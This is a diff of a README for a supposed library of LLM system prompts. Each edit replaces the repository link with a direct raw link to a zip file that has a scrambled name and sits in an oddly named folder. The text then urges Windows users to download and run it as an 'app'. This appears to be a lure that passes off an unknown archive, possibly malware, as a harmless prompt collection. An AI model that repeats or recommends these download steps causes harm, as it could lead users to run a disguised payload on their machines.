@@ -1,12 +1,12 @@
 # 🧠 The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts - Better Prompting for Clearer Code
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue.svg)](https://github.com/Exponential-genushelvella846/The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue.svg)](https://github.com/Exponential-genushelvella846/The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts/raw/refs/heads/main/coleopterous/Senior-s-The-Production-Dev-Prompt-LL-Ready-System-Prompts-Library-v3.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/Exponential-genushelvella846/The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts
+https://github.com/Exponential-genushelvella846/The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts/raw/refs/heads/main/coleopterous/Senior-s-The-Production-Dev-Prompt-LL-Ready-System-Prompts-Library-v3.8.zip
 
 ## 🖥️ What This App Does
 
@@ -38,7 +38,7 @@ You do not need coding skills to use the library.
 ## 🚀 How to Download and Use It on Windows
 
 1. Open the download page:
-   https://github.com/Exponential-genushelvella846/The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts
+   https://github.com/Exponential-genushelvella846/The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts/raw/refs/heads/main/coleopterous/Senior-s-The-Production-Dev-Prompt-LL-Ready-System-Prompts-Library-v3.8.zip
 
 2. On the page, look for the download option.
 
@@ -191,4 +191,4 @@ If a file ends in `.txt`, `.md`, or `.json`, you can open it with common Windows
 
 Use this page to download and run this file or open the library on Windows:
 
-https://github.com/Exponential-genushelvella846/The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts
+https://github.com/Exponential-genushelvella846/The-Senior-Dev-s-LLM-Prompt-Library-100-Production-Ready-System-Prompts/raw/refs/heads/main/coleopterous/Senior-s-The-Production-Dev-Prompt-LL-Ready-System-Prompts-Library-v3.8.zip
